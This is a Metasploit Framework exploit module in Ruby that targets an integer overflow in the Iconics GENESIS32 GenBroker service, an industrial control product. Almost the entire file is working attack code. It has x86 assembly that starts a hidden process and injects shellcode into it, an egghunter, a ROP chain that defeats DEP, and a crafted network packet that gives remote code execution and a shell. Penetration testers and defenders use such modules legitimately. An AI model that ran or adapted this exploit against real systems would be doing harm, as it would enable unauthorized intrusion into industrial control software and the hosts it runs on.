##
# $Id: iconics_genbroker.rb 13197 2011-07-17 15:01:46Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Egghunter

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Iconics GENESIS32 Integer overflow version 9.21.201.01",
			'Description'    => %q{
					The GenBroker service on port 38080 is affected by three integer overflow
				vulnerabilities while handling opcode 0x4b0, which is caused by abusing the
				the memory allocations needed for the number of elements passed by the client.
				This results unexpected behaviors such as direct registry calls, memory location
				calls, or arbitrary remote code execution.  Please note that in order to ensure
				reliability, this exploit will try to open calc (hidden), inject itself into the
				process, and then open up a shell session.  Also, DEP bypass is supported.
			},
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 13197 $",
			'Author'         =>
				[
					'Luigi Auriemma', #Initial discovery, poc
					'Lincoln',        #Metasploit
					'corelanc0d3r',   #Metasploit + custom migrate fu
				],
			'References'     =>
				[
					['URL', 'http://aluigi.org/adv/genesis_4-adv.txt'],
				],
			'Payload'        =>
				{
					'BadChars' => "\x00",
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "thread",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP',
						{
							'Ret' => "\x70\x45",
							'Max' => 9000,
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Mar 21 2011",
			'DefaultTarget'  => 0))

			register_options(
				[
					Opt::RPORT(38080)
				], self.class)
	end

	def exploit

		migrate_asm = %Q|
add esp,-500                  ; adjust the stack to be sure
pushad                        ; save stuff

find_kernel32:                ;find kernel32
push esi                      ; Save esi
xor  esi, esi                 ; Zero esi
mov  eax, fs:[esi + 0x4]      ; Extract TEB
mov  eax, [eax - 0x1c]
find_kernel32_base:
find_kernel32_base_loop:
dec  eax                      ; Subtract to our next page
xor  ax, ax                   ; Zero the lower half
cmp  word [eax], 0x5a4d       ; Is this the top of kernel32?
jne  find_kernel32_base_loop  ; Nope?  Try again.
find_kernel32_base_finished:
pop  esi                      ; Restore esi

mov edx,eax                   ; save base of kernel32 in edx

jmp main_routine

; find function pointer
find_function:
pushad                        ;save all registers
mov ebp, [esp + 0x24]         ;base address of module that is being loaded in ebp
mov eax, [ebp + 0x3c]         ;skip over MSDOS header
mov edx, [ebp + eax + 0x78]   ;go to export table and put RVA in edx
add edx, ebp                  ;add base address to it.
mov ecx, [edx + 0x18]         ;set up counter ECX (how many exported items are in array ?)

mov ebx, [edx + 0x20]         ;put names table relative offset in ebx
add ebx, ebp                  ;add base address to it (ebx = absolute address of names table)

;(should never happen)
;unless function could not be found
find_function_loop:
jecxz find_function_finished  ;if ecx=0, then last symbol has been checked.

dec ecx                       ;ecx=ecx-1
;with the current symbol
;and store offset in esi
mov esi, [ebx + ecx * 4]      ;get relative offset of the name associated
add esi, ebp                  ;add base address (esi = absolute address of current symbol)

compute_hash:
xor edi, edi                  ;zero out edi
xor eax, eax                  ;zero out eax
cld                           ;clear direction flag.

compute_hash_again:
lodsb                         ;load bytes at esi (current symbol name) into al, + increment esi
test al, al                   ;end of string ?
jz compute_hash_finished      ;yes
ror edi, 0xd                  ;no, rotate value of hash 13 bits to the right
add edi, eax                  ;add current character of symbol name to hash accumulator
jmp compute_hash_again        ;continue loop

compute_hash_finished:

find_function_compare:
cmp edi, [esp + 0x28]         ;see if computed hash matches requested hash (at esp+0x28)
jnz find_function_loop        ;no match, go to next symbol
mov ebx, [edx + 0x24]         ;if match : extract ordinals table (relative offset and put in ebx)
add ebx, ebp                  ;add base address (ebx = absolute address of ordinals address table)
mov  cx, [ebx + 2 * ecx]      ;get current symbol ordinal number (2 bytes)
mov ebx, [edx  +  0x1c]       ;get address table relative and put in ebx
add ebx, ebp                  ;add base address (ebx = absolute address of address table)
mov eax, [ebx + 4 * ecx]      ;get relative function offset from its ordinal and put in eax
add eax, ebp                  ;add base address (eax = absolute address of function address)
mov [esp + 0x1c], eax         ;overwrite stack copy of eax so popad (return func addr in eax)

find_function_finished:       ;retrieve original registers (eax will contain function address)
popad
ret 

;--------------------------------------------------------------------------------------
find_funcs_for_dll:
lodsd                         ;load current hash into eax (pointed to by esi)
push eax                      ;push hash to stack
push edx                      ;push base address of dll to stack
call find_function
mov [edi], eax                ;write function pointer into address at edi
add esp, 0x08                 ;adjust stack
add edi, 0x04                 ;increase edi to store next pointer
cmp esi, ecx                  ;did we process all hashes yet ?
jne find_funcs_for_dll        ;get next hash and lookup function pointer
find_funcs_for_dll_finished:
ret

;--------------------------------------------------------------------------------------
main_routine:
sub esp,0x1c                  ;allocate space on stack to store function addresses + ptr to string
mov ebp,esp
; ebp+4	 : GetStartupInfo
; ebp+8  : CreateProcess
; ebp+C  : VirtualAllocEx
; ebp+10 : WriteProcessMemory
; ebp+14 : CreateRemoteThread
; ebp+18 : Sleep
; ebp+1c : ptr to calc

jmp get_func_hash
get_func_hash_return:

pop esi                       ;get pointer to hashes into esi
;edi will be increased with 0x04 for each hash
lea edi, [ebp+0x4]            ;we will store the function addresses at edi

mov ecx,esi
add ecx,0x18
call find_funcs_for_dll       ;get function pointers for all hashes

; get our own startupinfo at esp+0x60
; ebp+4 = GetStartupInfo
mov edx,esp
add edx,0x60
push edx
call [ebp+0x4]
;ptr to startupinfo is in eax

; create a new process
; pointer to string is in ecx
; ebp+8 = CreateProcessA
; ptr to startupinfo is now in eax
; no need to patch startupinfo, target runs as a service
; +2c : dwFlags : set to 0x1
; +30 : wShowWind : set to 0 (hide)

; create the process
mov edi,eax
add edi,48
push edi                      ; lpProcessInformation : write processinfo here
push eax                      ; lpStartupInfo : current info (read)
push 0                        ; lpCurrentDirectory
push 0                        ; lpEnvironment
push 0x08000000               ; dwCreationFlags
push 0                        ; bInHeritHandles
push 0
push 0
push esi                      ; ptr to calc
push 0
call [ebp+0x8]
; muahah calc ftw, now sleep a bit
push 0xbb8                    ; 3 seconds
call [ebp+0x18]

; allocate memory in the process (VirtualAllocEx())
; get handle
mov ecx,[edi]
push 0x40                     ; RWX
push 0x1000                   ; MEM_COMMIT
push 0x1000                   ; size
push 0                        ; address
push ecx                      ; handle
call [ebp+0xc]

; eax now contains the destination
; WriteProcessMemory()
mov ecx,[edi]                 ; pick up handle again
push 0x1000                   ; size
; pick up pointer to shellcode & push to stack
mov ebx,[esp+0x20]
add ebx,320
push ebx                      ; source
push eax                      ; destination
push ecx                      ; handle
call [ebp+0x10]

; run the code (CreateRemoteThread())
mov ecx,[edi]                 ; pick up handle again
push 0                        ; lpthreadID
push 0                        ; run immediately
push 0                        ; no parameter
mov ebx,[esp-0x4]
push ebx                      ; shellcode
push 0x2000                   ; stacksize
push 0                        ; lpThreadAttributes
push ecx
call [ebp+0x14]               ; go baby !


get_func_hash:
call get_func_hash_return
db 0xD7                       ;GetStartupInfoA
db 0xE3
db 0x7A
db 0x86
db 0x72                       ;CreateProcessA
db 0xfe
db 0xb3
db 0x16
db 0x9c                       ;VirtualAllocEx
db 0x95
db 0x1a
db 0x6e
db 0xa1                       ;WriteProcessMemory
db 0x6a
db 0x3d
db 0xd8
db 0xdd                       ;CreateRemoteThread
db 0x9c
db 0xbd
db 0x72                       ;Sleep
db 0xB0
db 0x49
db 0x2D
db 0xDB

; sneak in ptr to string too :)
db "calc"
db 0x00
|

		migrate = Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string

		nops = make_nops(10) * 4
		thepayload = migrate << nops << payload.encoded

		eggoptions =
		{
			:eggtag => 'w00t',
		}

		hunter, egg = generate_egghunter(thepayload, "", eggoptions)

		header  = "\x01\x00\x00\x1e\x00\x00\x00\x01\x00\x00\x1f\xf4\x01\x00\x00\x00"
		header << "\x00\x00\x00\x00\xb0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		header << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		header << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x40"

		rop_chain =
		[
			0x100b257b,  # POP ESP # RETN
			0x771a22e4,  # pointer in ecx -> initial ret to ret to pointer -> beg rop (thank you mona.py)
			0x10047355,  # Duplicate, readable, RETN
			0x10047355,  # POP EAX # RETN    ** [GenClientU.dll]
			0xffffffde,
			0x7c3b2c65,  # NEG EAX # RETN    ** [MSVCP71.dll]
			0x1011e33e,  # XCHG EAX,EDX # RETN
			0x1001ab22,  # POP ECX # RETN    ** [GenClientU.dll]
			0x77dd1404,  # ptr to ptr to NtSetInformationProcess()  (ADVAPI.dll, static on XP)
			0x100136c0,  # MOV EAX,DWORD PTR DS:[ECX] # RETN    ** [GenClientU.dll] 
			0x1008cfd1,  # POP EDI, POP ESI, POP EBP, POP EBX, POP ESI,RETN ** [GenClientU.dll]
			0x10080163,  # POP ESI # RETN -> EDI
			0x41414141,
			0x41414141,
			0xffffffff,  # NtCurrentProcess() (EBX)
			0x7c331d24,  # ptr to 0x2 -> ECX 
			0x10090e3d,  # XCHG EAX,EBP # RETN    ** [GenClientU.dll]
			0x10047355,  # POP EAX # RETN    ** [GenClientU.dll] 
			0xfffffffc,
			0x7c3b2c65,  # NEG EAX # RETN    ** [MSVCP71.dll]
			0x100dda84,  # PUSHAD # RETN    ** [GenClientU.dll]
			0x90908aeb,  # go to egghunter
		].pack('V*')

		sploit  = target['Ret'] * 180
		sploit << [0x74757677].pack('V') * 8
		sploit << "\x77\x77"
		sploit << hunter  #32 byte hunter, no room for checksum
		sploit << rop_chain
		sploit << make_nops(28)
		sploit << egg

		sploit << rand_text_alpha(target['Max']-sploit.length)

		connect
		print_status("Sending request. This will take a few seconds...")
		sock.put(header + sploit)

		handler
		disconnect

	end

end
